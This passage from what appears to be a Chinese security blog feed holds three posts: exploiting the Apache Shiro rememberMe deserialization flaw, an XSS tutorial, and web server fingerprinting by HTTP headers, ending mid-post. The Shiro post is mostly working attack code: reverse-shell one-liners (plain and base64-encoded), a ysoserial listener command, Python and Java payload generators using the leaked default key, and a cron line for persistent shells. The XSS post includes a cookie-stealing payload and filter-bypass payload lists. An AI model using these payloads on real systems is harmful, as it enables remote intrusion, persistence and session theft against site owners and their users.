<p>​        Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
<p><strong>shiro反序列化流程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化--&gt;AES加密--&gt;base64--&gt;编码--&gt;发送cookie</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。<br>在服务端接收cookie值时，按照如下步骤来解析处理：</p>
<ul>
<li><p>  检索RememberMe cookie 的值</p>
</li>
<li><p>  Base 64解码</p>
</li>
<li><p>  使用AES解密(加密密钥硬编码)</p>
</li>
<li><p>  进行反序列化操作（未作过滤处理）</p>
</li>
</ul>
<p>在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>Shrio框架的特征是登录页面的cookie中存在remeberMe=deleteMe的内容。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>Apache Shiro &lt; 1.2.4</li>
</ul>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>  只要rememberMe的AES加密密钥泄漏，无论shiro什么版本都会导致反序列化漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过工具来检查key是否泄露</p>
<blockquote>
<p>  Shiro_Attack</p>
<p>  <a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p>
<p>  ShiroExploit</p>
<p>  <a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
<p>  反序列化利用链</p>
<p>  ysoserial</p>
<p>  <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
</blockquote>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地监听端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>对反弹shell命令生成bash格式编码</p>
<blockquote>
<p>  <a href="https://www.jackson-t.ca/runtime-exec-payloads.html">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8888 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<p>通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-cp</span> ysoserial<span class="literal">-0</span>.<span class="number">0.6</span><span class="literal">-SNAPSHOT</span><span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">6666</span> CommonsCollections4 <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<blockquote>
<p>  192.168.1.1:6666</p>
</blockquote>
<p>利用 python 代码和 ysoserial 生成 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="comment"># 这里使用 ysoserial 的 CommonsBeanutils1 模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;CommonsBeanutils1&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(<span class="string">&#x27;192.168.1.1:6666&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>

<p>命令写入文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;\n\n/* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n&quot; &gt; /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>



<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>把命令写入文件中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>

<p>生成payload</p>
<p>利用Java代码生成payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestRemember</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;d://poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把生成的值贴入rememberMe Cookie，即可成功执行命令</p>
<h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><p>如果攻击没有生效，尝试删除Cookie中的Jsessionid字段，防止服务端不去处理cookie</p>
<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>设置为获得随机key</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web服务器漏洞</category>
        <category>Apache</category>
        <category>常规漏洞</category>
        <category>Shiro</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS-跨站脚本漏洞</title>
    <url>//f6a9bc23287a.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>跨站脚本攻击-XSS（Cross Site Script），为不和层叠样式表（Cascading Style Sheets,CSS）的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
<p>是指攻击者通过Web页面中写入恶意JavaScript代码，造成用户在浏览页面时，嵌入其中的JavaScript代码会被执行，导致控制用户浏览器进行操作的攻击方式。</p>
<p><strong>XSS 的危害</strong></p>
<ul>
<li>  盗取 Cookie</li>
<li>  流量劫持</li>
<li>  网络钓鱼</li>
<li>  篡改页面信息</li>
<li>  获取信息</li>
<li>  恶意弹框</li>
<li>  配合CSRF进行蠕虫攻击</li>
</ul>
<h2 id="XSS-漏洞分类"><a href="#XSS-漏洞分类" class="headerlink" title="XSS 漏洞分类"></a>XSS 漏洞分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标，诱导目标访问该链接，造成用户向目标服务器发起GET请求</p>
<p>整个过程中，服务端只是接受数据然后处理，返回数据到浏览器，服务器并不储存XSS代码</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>持久型，当攻击者提交一段XSS代码后，被服务器接收并储存，当访客访问这个页面时，这段代码被程序运行响应给浏览器，造成XSS攻击。</p>
<p>常见的地方就是在博客留言板，反馈投诉，论坛文章、评论等，将恶意代码和正常的提交都保存在数据库，每次访问都会触发该代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;srcipt&gt;alert(<span class="regexp">/xss/</span>)&lt;/srcipt&gt;</span><br></pre></td></tr></table></figure>



<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型是特殊的反射型XSS，在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document Object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性，方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。</p>
<p>也就是说，客户端的脚本程序可以通过 DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行，从而造成XSS漏洞的利用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>代码中没有对用户的输入进行任何过滤，导致用户输入的字符串被当作代码执行</p>
<p>如以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">	&lt;title&gt;XSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">	&lt;?php</span><br><span class="line">		$Xss = $_GET[&#x27;input&#x27;];</span><br><span class="line">		echo &#x27;output:&lt;br&gt;&#x27;.$Xss;</span><br><span class="line">	?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>在上述代码中我们可以看到，用户所有的输入通过HTTP GET方法的预定义变量<code>$_GET[]</code>传入到变量<code>$Xss</code>中，又被<code>echo()</code>函数直接输出，这其中代码没有对用户的输入进行任何的过滤</p>
<p>如果我们在输入中添加 JavaScript 代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>那么代码中的语句就会变成下面这个样子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;output:&lt;br&gt;&#x27;.&#x27;&lt;script&gt;alert(/xss/)&lt;/script&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p>在网页中是以这样显示的，<code>&lt;script&gt;</code>被当作了元素块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ouput:&lt;br&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>虽然在代码中这只是一个保存在变量<code>$Xss</code>中的一串字符串</p>
<p>但是当代码通过浏览器显示出来，会被浏览器识别，当作<code>JavaScript</code>语句执行，如下所示</p>
<p><img src="https://i.loli.net/2021/11/24/LyqlTIZJhnrVXpC.png"></p>
<h2 id="测试-XSS-语句"><a href="#测试-XSS-语句" class="headerlink" title="测试 XSS 语句"></a>测试 XSS 语句</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(1);&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href = javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>所有用户控制输入的地方</p>
<ul>
<li><p>  URL</p>
</li>
<li><p>  论坛</p>
</li>
<li><p>  评论</p>
</li>
<li><p>  文章发布</p>
</li>
<li><p>  搜索框</p>
</li>
<li><p>  表单提交</p>
</li>
<li><p>  反馈</p>
</li>
<li><p>HTTP参数</p>
<p>  。。。</p>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>反弹cookie</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">##</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="XSS-漏洞绕过"><a href="#XSS-漏洞绕过" class="headerlink" title="XSS 漏洞绕过"></a>XSS 漏洞绕过</h2><h3 id="XSS-关键字变型"><a href="#XSS-关键字变型" class="headerlink" title="XSS 关键字变型"></a>XSS 关键字变型</h3><p><strong>大小写转换</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 只对标签有效,对JavaScript的对象无效</span><br><span class="line"># 初始语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 大写转换</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;JAVASCRIPT:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 大小写混淆</span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRc</span>=<span class="string">&quot;JaVaScRipt:alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>空格回车TAB绕过</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#　TAB绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javas		cript:alert(1);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#　回车绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javas</span></span></span><br><span class="line"><span class="string"><span class="tag">cript:</span></span></span><br><span class="line"><span class="string"><span class="tag">alert(1);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>不使用空格,引号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img/src=javascript:alert(1);&gt;</span><br></pre></td></tr></table></figure>

<p><strong>利用注释符</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;left:expre/**/ssion(alert(/xss/));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="XSS-关键字编码"><a href="#XSS-关键字编码" class="headerlink" title="XSS 关键字编码"></a>XSS 关键字编码</h3><h4 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h4><p>URL编码也叫做Escape编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># Escape编码</span><br><span class="line">%3Cscript%3Ealert%28/xss/%29%3C/script%3E</span><br></pre></td></tr></table></figure>

<h4 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h4><p>HTML实体编码其实就是ASCII编码</p>
<p>编码以<code>&amp;</code>开头，以<code>;</code>结尾</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 通过函数eval()</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># 把符号转换为实体名称</span><br><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(/xss/)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"># 把所有字符转换为实体编号</span><br><span class="line"><span class="symbol">&amp;#60;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#62;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#60;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#62;</span></span><br><span class="line"></span><br><span class="line"># 把所有字符转换为16进制的实体编号</span><br><span class="line"><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x78;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3C;</span><span class="symbol">&amp;#x2F;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3E;</span></span><br></pre></td></tr></table></figure>

<h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4><p>只能以命令执行的方式绕过</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 原语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"># Unicode编码,需要通过eval()函数执行语句</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">u0061</span>\<span class="attr">u006c</span>\<span class="attr">u0065</span>\<span class="attr">u0072</span>\<span class="attr">u0074</span>\<span class="attr">u0028</span>\<span class="attr">u0031</span>\<span class="attr">u0029</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
<li>对输入的数据进行实例化<ul>
<li>  PHP-htmlspecialchars 函数</li>
</ul>
</li>
<li>  对特定字符做编码转换</li>
<li>  过滤符号<code>&lt;&gt;</code>，<code>&#39;&#39;</code>，<code>&quot;&quot;</code>，<code>&amp;</code>，<code>\</code>，<code>#</code>，<code>%</code></li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集-WEB服务器</title>
    <url>//ef172fa947be.html</url>
    <content><![CDATA[<h2 id="WEB服务器简介"><a href="#WEB服务器简介" class="headerlink" title="WEB服务器简介"></a>WEB服务器简介</h2><p>WEB服务器是指网站服务器，用来使服务器提供WEB访问</p>
<p>可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览</p>
<h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>世界上使用最多的web服务器</p>
<p>具有跨平台，安全性高的优点</p>
<p>可以通过API扩展，将<code>perl/Python</code>等解释器编译到服务器中</p>
<p>下载地址：<a href="http://httpd.apache.org/">http://httpd.apache.org/</a></p>
<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># HTTP头部中server标头在Date之后</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br><span class="line"># 当HTTP返回404时，报错信息为Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Not Found</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache</span><br></pre></td></tr></table></figure>



<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>IIS（Internet Information Services）是Microsoft的Web服务组件</p>
<p>其中包括Web服务器，FTP服务器，NNTP服务器和SMTP服务器。</p>
<p>通过ISAP（Internet Server API）作为扩展web服务器功能的编程接口</p>
<p>通过Internet数据库连接器，可以实现对数据库的查询和更新</p>
<p>下载地址：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=48264">https://www.microsoft.com/zh-CN/download/details.aspx?id=48264</a></p>
<h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"># 当HTTP返回404时，报错信息为Object Not Found</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">404</span> Object Not Found</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Microsoft-IIS/5.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 23 Aug 2021 08:08:29 GMT</span><br></pre></td></tr></table></figure>



<h2 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h2><p>JBoss是一个种遵从JavaEE规范的、开放源代码的、纯Java的EJB服务器，对于J2EE有很好的支持</p>
<p>JBoss是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3的规范。</p>
<p>但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>下载地址：<a href="https://jbossas.jboss.org/downloads/">https://jbossas.jboss.org/downloads/</a></p>
<h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty是一种开源的servlet容器，它为基于Java的网络内容，如JSP和servlet提供运行环境。</p>
<h2 id="Kangle"><a href="#Kangle" class="headerlink" title="Kangle"></a>Kangle</h2><p>kangle web服务器（简称：kangle）是一款跨平台、功能强大、安全稳定、易操作的高性能web服务器和反向代理服务器软件。</p>
<p>kangle也是一款专为做虚拟主机研发的web服务器。实现虚拟主机独立进程、独立身份运行。</p>
<p>用户之间安全隔离，一个用户出问题不影响其他用户。安全支持php、asp、asp·net、java、ruby等多种动态开发语言。</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>Nginx不仅是一个小巧且高效的HTTP服务器，也可以做一个高效的负载均衡反向代理</p>
<p>通过它接受用户的请求并分发到多个Mongrel进程可以极大提高Rails应用的并发能力。</p>
<p>支持通用语言接口，如php、python、perl等</p>
<p>支持正向和反向代理、虚拟主机、url重写、压缩传输等</p>
<p> nginx的模块都是静态编译的，对fcgi的支持非常好，在处理链接的的方式上nginx支持epoll</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Tomcat运行servlet和JSP Web应用软件的基于Java的Web应用软件容器</p>
<p>Tomcat Server是根据servlet和JSP规范进行执行的</p>
<p>Tomcat是Apache软件基金会（ApacheSoftwareFoundation）的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。</p>
<h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p><strong>基于HTTP头部</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># HTTP头部中server标头显示web服务器信息</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Tomcat</span><br></pre></td></tr></table></figure>

<p><strong>基于404报错</strong></p>
<p>构造一个不存在的资源<br>URL/456sadaw.741<br>在源代码中包含如下代码</p>
